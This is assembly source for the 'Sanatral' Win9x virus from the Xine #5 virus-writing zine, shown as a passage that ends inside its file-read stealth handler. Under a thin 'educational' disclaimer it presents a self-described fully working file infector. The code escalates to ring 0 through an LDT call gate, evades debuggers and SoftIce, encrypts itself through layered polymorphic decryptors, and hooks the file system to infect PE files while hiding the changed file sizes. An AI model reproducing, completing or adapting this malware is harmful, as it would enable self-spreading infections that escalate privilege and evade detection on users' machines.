   ;
   ;
   ;                                              ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;                                              ³ Xine - issue #5 - Phile 207 ³
   ;                                              ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;
   ;
   ;
   ;
   ; comment       $
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;  Vital/IKX proudly presents:
   ;  The
   ;  ÜÜÜÜÜÜÜ ÜÜÜÜÜÜÜ ÜÜÜ ÜÜÜ ÜÜÜÜÜÜÜ ÜÜÜÜÜÜÜ ÜÜÜÜÜÜÜ ÜÜÜÜÜÜÜ ÜÜÜ
   ;  Û ÜÜÜÜÛ Û ÜÜÜ Û Û ßÛÛ Û Û ÜÜÜ Û ÛÜÜ ÜÜÛ Û ÜÜÜ Û Û ÜÜÜ Û Û Û
   ;  ÛÜÜÜÜ Û Û ÜÜÜ Û Û ÛÜß Û Û ÜÜÜ Û   Û Û   Û Ü ÜÜÛ Û ÜÜÜ Û Û ÛÜÜÜÜ
   ;  ÛÜÜÜÜÜÛ ÛÜÛ ÛÜÛ ÛÜÛßÛÜÛ ÛÜÛ ÛÜÛ   ÛÜÛ   ÛÜÛÜÜÜÛ ÛÜÛ ÛÜÛ ÛÜÜÜÜÜÛ
   ;                                          virus, v 1.0, for Win9x
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ; Disclaimer:
   ; This document was written for Xine#5, as an educational paper for
   ; people interrested in the study of Atrificial Life. You should not
   ; compile this virus unless it's your intention to test it in a
   ; controlled environment, and not without knowing that neither I nor
   ; the IKX takes any responsebilities for any loss of data, economical
   ; losses, or any other inconveinces caused by assembly, linking, and
   ; /or execution of the binary file produced. The virus is fully
   ; working, without any bugs that I know of. It is not designed to do
   ; any intentional damage to files or data exept from spreading, but
   ; ofcourse, I will not give any warranties, as this "article",
   ; "document", (or call it what you want) is intended for reading only,
   ; for educational purposes, Gotit? Furthermore, if you did not
   ; understand and accepted EVERYTHING stated above, you should
   ; immidiatly delete this file (if online read: leave this page).
   ; I (the author) does not, in any way, support the illegal spreading
   ; of computer viruses, while I believe it's a human right to explore
   ; the opportunities wich lies in Artificial Life and Intelligence.
   ;
   ; Residency and stealth:
   ; Ring-0 (driver mode) by LDT callgate tech, Full stealth on IFSMgr,
   ; the virus hooks OPEN (modify open mode), CLOSE (infect), READ
   ; (stealthn file areas modified by the virus), SEEK (manipulate seek
   ; to point within original file size), WRITE (get FSD for file write),
   ; FIND (show original file size), ENUMHANDLE (return original file
   ; size), and FILETIME (store filetime FSD for filetime stealth), a
   ; total of 8 file operations.
   ;
   ; Polymorphism:
   ; Virus is polymorphic by 3 layers (2 layers on main virus, 1 on
   ; CODE sections' 2nd decryptor and address calculations). The first
   ; decryptor mutates it's code and decryption algorithm (ofcourse
   ; according to the encryption algo.), some armouring (SEH mainly)
   ; is put after 1st decryption, on entrance to main decryptors, wich
   ; consists of a simple (variable algorithm) layer covering main
   ; decryptor and encrypted main body (locked by randomly between 16
   ; and 255 loops). Largest constant scanstring is currently 3 bytes.
   ;
   ; Misc stuff:
   ; Anti-heuristic infection: EntryPoint RVA points to virus "header"
   ; in CODE section, polymorphic virus body is appended to the end.
   ; Anti-monitoring as all file access is performed using direct FSD
   ; access, Anti-debugging, Anti-SoftIce.. infects DLL/SCR/OCX/CPL/EXE
   ; / all PE files.
   ;
   ; tasm32  /ml /v /m3 Sanatral.asm
   ; tlink32 /Tpe Sanatral.obj,Sanatral.exe
   ;
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;       $

   DEBUG           equ 1   ; if 1, do only infect files marked with MZxx in MZ header
   AVOIDDLL        equ 0   ; 0 to infect libraries (DLL), 1 to avoid them

   CallGateSelector    equ 8

   ; ehh.. this repeated warning is mostly for myself =) I hate infecting my own stuff uncontrolled :)

   IF DEBUG
       ELSE
       %out    WARNING: THE VIRUS IS ASSEMBLED OUTSIDE DEBUG MODE!!
       %out    Executing the produced "Sanatral.exe" will infect your
       %out    system! Be very careful with this file..
   ENDIF

   ; Vxd services

   VMM_Hook_V86_Int_Chain          equ     00010041h
   VMM_Get_V86_Int_Vector          equ     00010042h
   VMM_Set_V86_Int_Vector          equ     00010043h
   VMM_Get_PM_Int_Vector           equ     00010044h
   VMM_Set_PM_Int_Vector           equ     00010045h
   IOS_SendCommand                 equ     00100004h
   VMM_Get_DDB                     equ     00010146h
   IFSMGR_GetHeap                  equ     0040000Dh
   IFSMGR_RetHeap                  equ     0040000Eh
   IFSMGR_InstallFileSystemApiHook equ     00400067h
   IFSMGR_Ring0_FileIO             equ     00400032h
   VMM_Get_Cur_VM_Handle       equ     00010001h
   VMM_PageReserve                 equ     0001011Dh
   VMM_PageCommit                  equ     0001011Eh
   VMM_Get_System_Time             equ     0001003Fh
   VMM_Get_Cur_VM_Handle       equ     00010001h
   SHELL_SYSMODAL_Message      equ     00170003h



   IOR STRUC
   IOR_next        dd  ?
   IOR_func        dw  ?
   IOR_status      dw  ?
   IOR_flags       dd  ?
   IOR_callback        dd  ?
   IOR_start_addr_LOW  dd  ?
   IOR_start_addr_HI   dd  ?
   IOR_xfer_count      dd  ?
   IOR_buffer_ptr      dd  ?
   IOR_private_client  dd  ?
   IOR_private_IOS     dd  ?
   IOR_private_port    dd  ?
   IOR_ioctl_drive     dw  ?
   IOR_ioctl_function  dw  ?
   IOR_ioctl_control_param dd  ?
   IOR_ioctl_buffer_ptr    dd  ?
   IOR_ioctl_client_params dd  ?
   IOR_ioctl_return    dd  ?
   IOR_req_req_handle  dd  ?
   IOR_req_vol_handle  dd  ?
   IOR_sgd_lin_phys    dd  ?
   IOR_num_sgds        db  ?
   IOR_vol_designtr    db  ?
   IOR_ios_private_1   dw  ?
   IOR_reserved_2      dq  ?
   IOR ENDS


   ADVAPI_MEMORY   struc
   ddRegOpenKeyA       dd  ?
   ddRegSetValueExA    dd  ?
   ddRegCloseKey       dd  ?
   ddRegCreateKeyA     dd  ?
   ADVAPI_MEMORY   ends

   STEALTH_PE_DATA struc
   sdOffsetOfLastSectionHeader dd  ?
   sdOffsetOfCodeSectionHeader dd  ?
   sdEntryPointRVA         dd  ?
   sdImageSize         dd  ?
   sdCodeSize          dd  ?
   sdCheckSum          dd  ?
   sdFileTime          dd  ?
   STEALTH_PE_DATA ends

   STEALTH_TABLE   struc
   OriginalLastSection db  40 dup (?)
   OriginalCodeSection db  40 dup (?)
   PEData          STEALTH_PE_DATA <?>
   STEALTH_TABLE   ends

   stealth_table_size  equ size STEALTH_TABLE


   PORTABLE_EXECUTABLE_HEADER  struc

       ; Image File Header

       PE_Signature                dd  ?
       IFH_CPUType             dw  ?
       IFH_NumberOfSections            dw  ?
       IFH_TimeDateStamp           dd  ?
       IFH_PointerToSymbolTable        dd  ?
       IFH_NumberOfSymbols         dd  ?
       IFH_SizeOfOptionalHeader        dw  ?
       IFH_Characteristics         dw  ?

       ; NT Optional Header

       NTOH_Magic              dw  ?
       NTOH_MajorLinkerVersion         db  ?
       NTOH_MinorLinkerVersion         db  ?
       NTOH_SizeOfCode             dd  ?
       NTOH_SizeOfInitializedData      dd  ?
       NTOH_SizeOfUninitializedData        dd  ?
       NTOH_EntryPointRVA          dd  ?
       NTOH_BaseOfCode             dd  ?
       NTOH_BaseOfData             dd  ?
       NTOH_ImageBase              dd  ?
       NTOH_SectionAlignment           dd  ?
       NTOH_FileAlignment          dd  ?
       NTOH_MajorOperatingSystemVersion    dw  ?
       NTOH_MinorOperatingSystemVersion    dw  ?
       NTOH_MajorImageVersion          dw  ?
       NTOH_MinorImageVersion          dw  ?
       NTOH_MajorSubsystemVersion      dw  ?
       NTOH_MinorSubsystemVersion      dw  ?
       NTOH_Reserved1              dd  ?
       NTOH_SizeOfImage            dd  ?
       NTOH_SizeOfHeaders          dd  ?
       NTOH_CheckSum               dd  ?
       NTOH_Subsystem              dw  ?
       NTOH_DllCharacteristics         dw  ?
       NTOH_SizeOfStackReserve         dd  ?
       NTOH_SizeOfStackCommit          dd  ?
       NTOH_SizeOfHeapReserve          dd  ?
       NTOH_SizeOfHeapCommit           dd  ?
       NTOH_LoaderFlags            dd  ?
       NTOH_NumberOfRvaAndSizes        dd  ?

   PORTABLE_EXECUTABLE_HEADER  ends


   IMAGE_FILE_SYSTEM              EQU 1000h ; System File
   IMAGE_FILE_DLL                 EQU 2000h ; File is a DLL

   L   equ <large>


   REG_SZ          equ 1
   REG_DWORD       equ 4
   HKEY_CLASSES_ROOT   equ 80000000h
   KEY_ALL_ACCESS      equ 0000003Fh
   HKEY_LOCAL_MACHINE  equ 80000002h
   PROCESS_ALL_ACCESS  equ 001F0FFFh
   MB_OK           EQU 00H
   MB_OKCANCEL     EQU 01H
   MB_ABORTRETRYIGNORE EQU 02H
   MB_YESNOCANCEL      EQU 03H
   MB_YESNO        EQU 04H
   MB_RETRYCANCEL      EQU 05H
   MB_ICONHAND     EQU 10H
   MB_ICONEXCLAMATION  EQU 30H
   MB_ICONASTERISK     EQU 40H
   MB_DEFBUTTON1       EQU 00H
   MB_DEFBUTTON2       EQU 100H
   MB_DEFBUTTON3       EQU 200H
   MB_APPLMODAL        EQU 00H
   MB_SYSTEMMODAL      EQU 1000H
   MB_NOFOCUS      EQU 8000H
   MB_ASAP         EQU 80000000H
   MB_NOWINDOW     EQU 40000000H
   MB_HANGSYS      EQU 20000000H


   VxdCall macro   service_id
       int 20h
       dd  service_id
   endm

   VxdJmp  macro   service_id
       int 20h
       dd  service_id+8000h
   endm

   TRUE    equ 1
   FALSE   equ 0

   ; parameters for SHELL_SYSMODAL_Message

   MB_ABORTRETRYIGNORE equ 00000002h
   MB_SYSTEMMODAL          EQU     00001000h


   ;* Win32 Date Time structure
   ; This structure defines the new Win32 format structure for returning the
   ; date and time

   FILETIME       struc
     dwLowDateTime dd      ?
     dwHighDateTime dd     ?
   FILETIME       ends

   ;* Win32 File Info By Handle Structure
   ;  This structure defines the contents of the result buffer on a
   ;  Win32 FileInfoByHandle. These calls are accessed by the new
   ;  LFN find apis

   BY_HANDLE_FILE_INFORMATION     struc   ; bhfi
     bhfi_dwFileAttributes         dd      ?
     bhfi_ftCreationTime           FILETIME    <?>
     bhfi_ftLastAccessTime         FILETIME    <?>
     bhfi_ftLastWriteTime          FILETIME    <?>
     bhfi_dwVolumeSerialNumber     dd      ?
     bhfi_nFileSizeHigh            dd      ?
     bhfi_nFileSizeLow             dd      ?
     bhfi_nNumberOfLinks           dd      ?
     bhfi_nFileIndexHigh           dd      ?
     bhfi_nFileIndexLow            dd      ?
   BY_HANDLE_FILE_INFORMATION     ends

   ;* Values for ir_flags for HM_FILETIMES:
   GET_MODIFY_DATETIME     equ     0       ; get last modification date/time
   SET_MODIFY_DATETIME     equ     1       ; set last modification date/time
   GET_LAST_ACCESS_DATETIME equ    4       ; get last access date/time
   SET_LAST_ACCESS_DATETIME equ    5       ; set last access date/time
   GET_CREATION_DATETIME   equ     6       ; get creation date/time
   SET_CREATION_DATETIME   equ     7       ; set creation date/time


   ;* Win32 Find Structure
   ;  This structure defines the contents of the result buffer on a
   ; Win32 FindFirst / FindNext. These calls are accessed by the new
   ; LFN find apis

   WIN32_FIND_DATA        struc
     dwFileAttributes      dd      ?
     ftCreationTime        FILETIME    <?>
     ftLastAccessTime      FILETIME    <?>
     ftLastWriteTime       FILETIME    <?>
     nFileSizeHigh         dd      ?
     nFileSizeLow          dd      ?
     dwReserved0           dd      ?
     dwReserved1           dd      ?
     cFileName             dw      260 dup (?)        ; includes NUL
     cAlternateFileName    dw      14 dup (?)              ; includes NUL
   WIN32_FIND_DATA        ends


   IMAGE_SCN_MEM_EXECUTE       equ 20000000h
   IMAGE_SCN_MEM_READ      equ 40000000h
   IMAGE_SCN_MEM_WRITE     equ 80000000h
   IMAGE_SCN_CNT_INITIALIZED_DATA  equ 00000040h


   ACCESS_MODE_MASK        equ     00007h  ; Mask for access mode bits
   ACCESS_READONLY         equ     00000h  ; open for read-only access
   ACCESS_WRITEONLY        equ     00001h  ; open for write-only access
   ACCESS_READWRITE        equ     00002h  ; open for read and write access
   ACCESS_EXECUTE          equ     00003h  ; open for execute access

   ACTION_MASK             equ     0ffh    ; Open Actions Mask
   ACTION_OPENEXISTING     equ     001h    ; open an existing file
   ACTION_REPLACEEXISTING  equ     002h    ; open existing file and set length
   ACTION_CREATENEW        equ     010h    ; create a new file, fail if exists
   ACTION_OPENALWAYS       equ     011h    ; open file, create if does not exist
   ACTION_CREATEALWAYS     equ     012h    ; create a new file, even if it exists

   ioreq   struc
     ir_length dd  ?       ; length of user buffer
     ir_flags  db  ?       ; misc. status flags
     ir_user   db  ?       ; user ID for this request
     ir_sfn    dw  ?       ; System File Number of file handle
     ir_pid    dd  ?       ; process ID of requesting task
     ir_ppath  dd  ?       ; unicode pathname
     ir_aux1   dd  ?       ; secondary user data buffer
     ir_data   dd  ?       ; ptr to user data buffer
     ir_options    dw  ?       ; request handling options
     ir_error  dw  ?       ; error code (0 if OK)
     ir_rh     dd  ?       ; resource handle
     ir_fh     dd  ?       ; file (or find) handle
     ir_pos    dd  ?       ; file position for request
     ir_aux2   dd  ?       ; misc. extra API parameters
     ir_aux3   dd  ?       ; misc. extra API parameters
     ir_pev    dd  ?       ; ptr to IFSMgr event for async requests
     ir_fsd    db      16 dup (?)  ; Provider work space
   ioreq   ends

   ioreqsize   equ size    ioreq

   hndlfunc        struc
       hf_read     dd      ?       ; file read handler function
       hf_write    dd      ?       ; file write handler function
       hf_misc     dd      ?       ; ptr to misc. function vector
   hndlfunc        ends

   fhandle struc
     fh_hf         hndlfunc ?
     fh_fh         dd      ?
     fh_psr        dd      ?
     fh_pSFT       dd      ?
     fh_position   dd      ?
     fh_devflags   dw      ?
     fh_hflag      db      ?
     fh_type       db      ?
     fh_ref_count  dw      ?
     fh_mode       dw      ?
     fh_hlockinfo  dd      ?
     fh_prev       dd      ?
     fh_next       dd      ?
     fh_sfn        dw      ?
     fh_mmsfn      dw      ?
     fh_pid        dd      ?
     fh_ntid       dd      ?
     fh_fhFlags    dw      ?
     fh_InCloseCnt dw      ?
   fhandle ends

   hndlmisc        struc
     hm_version    dw      ?       ; IFS version #
     hm_revision   db      ?       ; IFS interface revision #
     hm_size       db      ?       ; # of entries in table
     hm_func       dd      ?
   hndlmisc        ends

   IFSMgr_hook_parameters      struc
   FSDFnAddr   dd  ?
   FunctionNum dd  ?
   Drive       dd  ?
   ResourceFlags   dd  ?
   CodePage    dd  ?
   ptrToIOREQ  dd  ?
   IFSMgr_hook_parameters      ends


   IFSFN_READ          equ     0               ; read a file
   IFSFN_WRITE         equ     1               ; write a file
   IFSFN_FINDNEXT          equ     2               ; LFN handle based Find Next
   IFSFN_SEEK          equ     10              ; Seek file handle
   IFSFN_CLOSE         equ     11              ; close handle
   IFSFN_FILETIMES         equ     14              ; get/set file modification time
   IFSFN_HANDLEINFO        equ 16              ; get/set file information
   IFSFN_ENUMHANDLE        equ 17              ; enum file handle information
   IFSFN_FINDCLOSE         equ     18              ; LFN find close
   IFSFN_DELETE            equ     31              ; file delete
   IFSFN_FILEATTRIB        equ     33              ; DOS file attribute manipulation
   IFSFN_OPEN          equ     36              ; open file
   IFSFN_RENAME            equ     37              ; rename path
   IFSFN_FINDOPEN          equ     44              ; open  an LFN file search
   IFSFN_SEARCH            equ 38

   ;* Values for ir_flags for HM_HANDLEINFO call:
   HINFO_GET               equ     0       ; retrieve current buffering info
   HINFO_SETALL            equ     1       ; set info (all parms)
   HINFO_SETCHARTIME       equ     2       ; set handle buffer timeout
   HINFO_SETCHARCOUNT      equ     3       ; set handle max buffer count

   ;* Values for ir_flags for HM_ENUMHANDLE call:
   ENUMH_GETFILEINFO       equ     0       ; get fileinfo by handle
   ENUMH_GETFILENAME       equ     1       ; get filename associated with handle
   ENUMH_GETFINDINFO       equ     2       ; get info for resuming
   ENUMH_RESUMEFIND        equ     3       ; resume find operation
   ENUMH_RESYNCFILEDIR     equ     4       ; resync dir entry info for file

   ;* Values for ir_flags for HM_SEEK:
   FILE_BEGIN      equ     0               ; absolute posn from file beginning
   FILE_END        equ     2               ; signed posn from file end

   R0_FILEATTRIBUTES       equ 04300h      ; Get/Set Attributes of a file
   R0_OPENCREATFILE        equ 0D500h      ; Open/Create a file
   R0_READFILE         equ 0D600h      ; Read a file, no context
   R0_WRITEFILE            equ 0D601h      ; Write to a file, no context
   R0_CLOSEFILE            equ 0D700h      ; Close a file
   R0_GETFILESIZE          equ 0D800h      ; Get size of a file
   R0_FINDFIRSTFILE        equ     04E00h      ; Do a LFN FindFirst operation
   R0_FINDNEXTFILE         equ     04F00h      ; Do a LFN FindNext operation
   R0_FINDCLOSEFILE        equ     0DC00h      ; Do a LFN FindClose operation

   ObjectHeader    struc
   ObjectName      db  8 dup(?); null-padded string identifying section
   PhysicalSize        dd  ?   ; physical size
   RVA         dd  ?   ; RVA to be loaded to
   VirtualSize     dd  ?   ; virtual size (physical size rounded up to object alignement)
   PhysicalOffset      dd  ?   ; offset in file of data
   Reserved1       dd  ?
   Reserved2       dd  ?
   Reserved3       dd  ?
   Flags           dd  ?   ; section flags
   ObjectHeader    ends

   IMAGE_SCN_MEM_EXECUTE       equ 20000000h
   IMAGE_SCN_MEM_READ      equ 40000000h
   IMAGE_SCN_MEM_WRITE     equ 80000000h
   IMAGE_SCN_CNT_INITIALIZED_DATA  equ 00000040h

   pfad    struc
     pfad_edi      dd      ?
     pfad_esi      dd      ?
     pfad_ebp      dd      ?
     pfad_esp      dd      ?
     pfad_ebx      dd      ?
     pfad_edx      dd      ?
     pfad_ecx      dd      ?
     pfad_eax      dd      ?
     pfad_eflags   dd      ?
     pfad_ret      dd      ?
   pfad    ends

   pfadsize    equ size    pfad

   RECT    STRUC
   x       dw  ?
   y       dw  ?
   Width       dw  ?
   Height      dw  ?
   RECT    ends

   SYSTEMTIME  struc
   wYear       dw  ?
   wMonth      dw  ?
   wDayOfWeek  dw  ?
   wDay        dw  ?
   wHour       dw  ?
   wMinute     dw  ?
   wSecond     dw  ?
   wMilliseconds   dw  ?
   SYSTEMTIME  ends

   ; some stuff lifted from VMM.INC

   Exception_Handler_Struc STRUC
   EH_Reserved DD  ?
   EH_Start_EIP    DD  ?
   EH_End_EIP  DD  ?
   EH_Handler  DD  ?
   Exception_Handler_Struc ENDS

   ; PR_PRIVATE Or PR_SYSTEM

   PR_PRIVATE  EQU 80000400H
   PR_SHARED   EQU 80060000H
   PR_SYSTEM   EQU 80080000H
   PR_FIXED    EQU 00000008H
   PR_4MEG     EQU 00000001H
   PR_STATIC   EQU 00000010H
   PD_ZEROINIT EQU 00000001H
   PD_NOINIT   EQU 00000002H
   PD_FIXEDZERO    EQU 00000003H
   PD_FIXED    EQU 00000004H
   PC_FIXED    EQU 00000008H
   PC_LOCKED   EQU 00000080H
   PC_LOCKEDIFDP   EQU 00000100H
   PC_WRITEABLE    EQU 00020000H
   PC_USER     EQU 00040000H
   PC_INCR     EQU 40000000H
   PC_PRESENT  EQU 80000000H
   PC_STATIC   EQU 20000000H
   PC_DIRTY    EQU 08000000H
   PC_CACHEDIS EQU 00100000H
   PC_CACHEWT  EQU 00080000H
   PC_PAGEFLUSH    EQU 00008000H
   PCC_ZEROINIT    EQU 00000001H
   PCC_NOLIN   EQU 10000000H

   ;
   ;
   ;ÄÄÄ[Sanatral.asm]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ; include Sanatral.inc

   vsize           equ (data - vstart)
   mem_vsize       equ (((end_data - vstart)/1000h)+1)*1000h
   mem_vsize_in_pages  equ mem_vsize shr 12
   virus_aligned       equ ((vsize/2048)+1)*2048
   file_align      equ 3FFh        ; infect files aligned to 1Kb


   TOPCRYPT        equ 1


   ;

   .586p
   .model flat

   .code

   start:      lea eax,FakeEntryPoint  ; fake a return-EP
           push    eax         ; for first generation..
           pushad
           xor ebp,ebp         ; program mode = VX 8)
           jmp install
   FakeEntryPoint: ret









   ;********************************************
   ;********************************************
   ;* Virus 1st decryptors and loader, located *
   ;* in host's CODE section           *
   ;********************************************
   ;********************************************



   SANATRAL    segment dword use32 public 'SANATRAL'

   vstart:encrypted:loader:

       ;/* Mutated decryptor, starts with 3 byte constant, wich is this virus'
       ;   longest constant scanstring */

           push    eax                 ; store room for return address to host, our 1st decryptor key...
           pushad                      ; store registers

       ;/* Get delta a nifty way */

           push    01000000h
           org $ - 4
   @stackregz: pop esi
           push    esi
           ret
   @dummy:     nop
   @ifix1:     mov eax,esp
           call    eax         ; returns @addfix address in ESI, 2 bytes
   @addfix:    add esi,(TopCrypt-@addfix)
   @xchgfix:   xchg    esi,esi         ; for mutation.. (on registers)
   @ifix2:     add esp,4           ; 3 bytes, fix stack

       ;/* Decryptor */

   @ifix3:     mov ebx,01000000h
   TopCryptKey equ dword ptr [$ - 4]
           nop             ; padding for mutation (push, pop)
   @ifix4:     mov ecx,(TopCryptSize-3)    ; 5 bytes
   @ifix5:     mov edi,esi         ; push  esi, pop edi
   @ifix6:     lodsd
           nop
           nop
           nop
           nop
   dec_algo:   xor eax,ebx
           rol eax,1
           add eax,ebx
   @ifix7:     sub esi,3
   @ifix8:     stosd
           nop
           loop    @ifix5

       ;/*** Encrypted area of virus loader ***/

       ; Will get delta host, host return address, and decrypt the main virus' top layer
       ; and main decryptor.

   TopCrypt:   jmp set_delta
   get_delta:  pop ebp                 ; Get delta
           sub ebp,offset delta



           pushad
           lea eax,[ebp+SEH_gnaff]
           push    eax
           jmp Muehehe
   ;begone suckerz..
   SEH_gnaff:  mov esp,[esp+8]             ; gets the ESP when SEH was set
           pop dword ptr fs:[0]
           add esp,4
           popad


           lea eax,[ebp+vstart]
           mov [esp+32],eax
           mov eax,01000000h
   HostPtr     equ dword ptr [$ - 4]
           sub dword ptr [esp+32],eax          ; stack above PUSHAD holds return address to host
           mov eax,01000000h
   DiffPtr     equ dword ptr [$ - 4]           ; delta difference between loader and body
           add ebp,eax

       ;/- Decrypt main virus' top layer and main decryptor -/

           lea esi,[ebp+encrypted]         ; ESI pts to start of encrypted code..
           pushad

           mov ebx,91A03F18h
   MainTopLayerKey equ dword ptr [$ - 4]

           mov ecx,(lsize-3)
           add esi,(lsize-3)-1             ; starting at end decrypting forwards
   dec5:       mov edi,esi
           lodsd
   simple_dec: db  6 dup (90h)
           stosd
           sub esi,3+2     ; -3 as we're decryptin' dwords byte by byte, -2 as we're going backwards in code
           loop    dec5


           popad

       ;/- Jmp to main decryptor using SEH -/

           pushad                      ; save regs 8)
           lea eax,[ebp+poly_decrypt]
           push    eax
   Muehehe:    mov ecx,fs:[20h]            ; muehehe DebugContext :))
           push    dword ptr fs:[ecx]      ; store old SEH
           mov fs:[ecx],esp            ; set a new
           mov [ecx],ecx           ; Crash program -> Jump
   set_delta:  call    get_delta
   delta:
   TopCryptSize    equ $ - TopCrypt
   patchsize   equ $ - vstart

   szIDString  db  "[Sanatral.",vsize/1000 mod 10 +"0"
           db  vsize/100 mod 10 +"0"
           db  vsize/10 mod 10 +"0"
           db  vsize/1 mod 10 +"0"," by ThermoBit/IkX,y2K]", 0


       ;/* Header encryption (for the CODE section loader) 32-bit simple */

   TopCryptEnc:    lea esi,[ebp+loader]
           lea edi,[ebp+LoaderBuffer]
           push    edi
           mov ecx,patchsize
           rep movsb

           pop esi
           add esi,(TopCrypt-loader)+((TopCryptSize-3)-1)

           mov ebx,[ebp+TopCryptKey]
           mov ecx,(TopCryptSize-3)

   TopCryptEncLoop:mov edi,esi
           lodsd

   enc_algo:   sub eax,ebx
           ror eax,1
           xor eax,ebx

           sub esi,3+2
           stosd
           loop    TopCryptEncLoop
           ret


       ;/* 32-bit simple top-layer encryption */

   SimpleCrypt:    mov ecx,(lsize-3)
           mov ebx,[ebp+MainTopLayerKey]

   enc5:       mov edi,esi
           lodsd
   simple_enc: db  6 dup (90h)
           stosd
           sub esi,3

           loop    enc5
           ret


   ;*********************************************************
   ;*                           *
   ;* <Win9x> driver memory installation            *
   ;*********************************************************

   install:    xor ecx,ecx
           sldt    cx
           jcxz    NT
           and cl, not (111b)
           jmp @@@4
   NT:     popad
           ret

       ;/* Switch application mode to Vxd driver using LDT */

   @@@3:       xchg    esi,[esp]
           sgdt    [esp-2]
           pop edx             ; EDX = GDT base address
           add edx,ecx
           mov al, [edx+4]
           mov ah, [edx+7]
           shl eax,10h
           mov ax, [edx+2]
           lea edi,[eax+CallGateSelector]
           cld
           mov     ax,si
           stosw
           mov     eax,0EC000000h + 28h
           stosd
           shld    eax,esi,10h
           stosw
           popad
           db      09Ah                ; call Ring0_CS:ESI
           dd      ?
           dw      CallGateSelector+111b
           ret                 ; return to host
   @@@4:       call    @@@3
           pushfd
           pushad


           mov eax,202h
           VxdCall VMM_Get_DDB
           test    ecx,ecx             ; Check for SoftIce
           jnz back_ring3          ; don't load under softice

           mov eax,dr1
           cmp eax,'grrr'
           jz  back_ring3          ; assume already resident



           call    get_r0_delta
   get_r0_delta:   pop ebp
           sub ebp,offset get_r0_delta




           push    mem_vsize           ; size of memory block needed
           VxdCall IFSMGR_GetHeap          ; allocate our TSR memory
           pop ecx             ; ECX = nr. of bytes to copy (fix stack)

       ;/* Copy virus into windoze memory */

           mov ecx,vsize
           lea esi,[ebp+vstart]        ; source: start of virus code
           mov edi,eax             ; destination (IFSMgr heap memory)
           rep movsb               ; copy virus to allocated memory

       ;/* Install our FileSystem API hook */

           mov edi,(IFSHook-vstart)        ; edi holds difference from base addr. to hook addr.
           xadd    eax,edi             ; EAX = pointer to our hook, EDI = pointer to our memory
           push    eax             ; address of our hook
           VxdCall IFSMGR_InstallFileSystemApiHook ; install our API hook, EAX = next hook handler
           pop edx             ; fix stack (damn vxds)
           mov edx,[eax]           ; get address from entry
           xchg    [edi+(NextIFSHook-vstart)],edx  ; store next hook address in our hook handler's code

   ;       mov eax,13h
   ;       lea esi,[ebp+Disk_Access_Hook]
   ;       VxdCall VMM_Hook_V86_Int_Chain

       ;/* Mark us resident and return */

           mov eax,'grrr'
           mov dr1,eax
   back_ring3: popad
           popfd
           retf


   ;********************************************************
   ;*                          *
   ;* Win9x file system API hook. calls the apropiate  *
   ;* handlers for interresting calls          *
   ;********************************************************


   IFSHook:    push    12345678h
   NextIFSHook equ $ - 4
           pushad

           mov eax,dr0
           cmp eax,'BUSY'
           jz  next_no_topchn
           call    hook_delta
   hook_delta: pop ebp
           sub ebp,offset hook_delta       ;
           lea esi,[esp+40]
           mov edx,[esi.FSDFnAddr]
           mov edi,[esi.ptrToIOREQ]
                   movzx   eax,[edi.ir_error]
                   or      eax,eax             ; check for errors
                   jnz     next_no_topchn
           mov eax,'BUSY'
           mov dr0,eax
           mov eax,[esi.FunctionNum]


       ;/* Intercept following functionz */

           cmp al,IFSFN_OPEN           ; modify open mode (r/w)
           jz  FileOpen
           cmp al,IFSFN_CLOSE          ; infect file (while still open)
           jz  FileClose
           cmp al,IFSFN_READ           ; stealthn virus data
           jz  FileRead
           cmp al,IFSFN_WRITE          ; get FSD function for file writing..
           jz  FileWrite
           cmp al,IFSFN_SEEK           ; manipulate seek so end of file will be original end
           jz  SeekFile
           cmp al,IFSFN_FINDOPEN       ; show original filesize
           jz  FindFile
           cmp al,IFSFN_FINDNEXT       ; show original filesize
           jz  FindFile
           cmp al,IFSFN_ENUMHANDLE     ; return original filesize
           jz  EnumHandle
           cmp al,IFSFN_FILETIMES      ; store FileTimes FSD for filetime stealth
           jz  FileTime



   next_ifs_hook:  xor eax,eax
           mov dr0,eax             ; mark virus inactive in debug register
   next_no_topchn: popad                   ; restore registers
           ret                 ; jmp to next handler in the IFS chain, we're out!
   exit_ifs_hook:  popad                   ; Return hook without passing control
           pop eax
           xor eax,eax
           ret
   next_hooker:    pushad                  ; Calls the next IFSMgr API hooker in chain
           push    [esi.ptrToIOREQ]
           push    [esi.CodePage]
           push    [esi.ResourceFlags]
           push    [esi.Drive]
           push    [esi.FunctionNum]
           push    [esi.FSDFnAddr]
           call    dword ptr [ebp+NextIFSHook]
           add esp, 6*4
           popad
           ret


   ;*********************************************************
   ;*                           *
   ;* Make sure no attempts to read after original end of   *
   ;* file succeeds, stealthn sensetive data...         *
   ;*********************************************************


   FileRead:   mov [ebp+fsd_read],edx
           mov edx,[ebp+fsd_seek]
           test    edx,edx
           jz  next_ifs_hook

           xchg    ebx,esi
           lea esi,[ebp+seek_ioreq]

           pushad
           xchg    esi,edi             ; ESI points to ioreq structure, EDI to our buffer
           mov ecx,size ioreq
           rep movsb
           popad

           mov [esi.ir_flags],FILE_END
           mov [esi.ir_pos],0
           push    esi
           call    edx             ; seek to end of file
           pop esi
           mov cx,[esi.ir_error]       ; check for errors
           test    cx,cx
           jnz next_ifs_hook

           mov eax,[esi.ir_pos]
           cmp eax,vsize
           jbe next_ifs_hook

           sub eax,vsize
